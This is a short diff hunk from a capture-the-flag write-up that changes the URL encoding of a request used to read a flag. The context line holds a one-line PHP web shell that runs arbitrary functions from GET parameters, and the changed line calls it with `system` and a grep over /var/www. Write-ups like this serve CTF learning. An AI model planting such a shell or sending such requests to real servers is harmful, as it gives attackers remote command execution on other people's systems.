@@ -112,7 +112,7 @@ Then, inspired by some ideas found on the internet I have created the `reverse s
 // final <?=$_GET[_]($_GET[__])
 ```
 
-And then after visiting the URL `http://138.68.228.12/alien_message/super_secret_shell.php?_=system&__=rgrep%20%27MeePwn%27%20/var/www/` we see the flag: **MeePwnCTF{__133-221-333-123-111___}**
+And then after visiting the URL `http://138.68.228.12/alien_message/super_secret_shell.php?_=system&__=rgrep MeePwn /var/www/` we see the flag: **MeePwnCTF{__133-221-333-123-111___}**
 
 
 ## Alternative solution
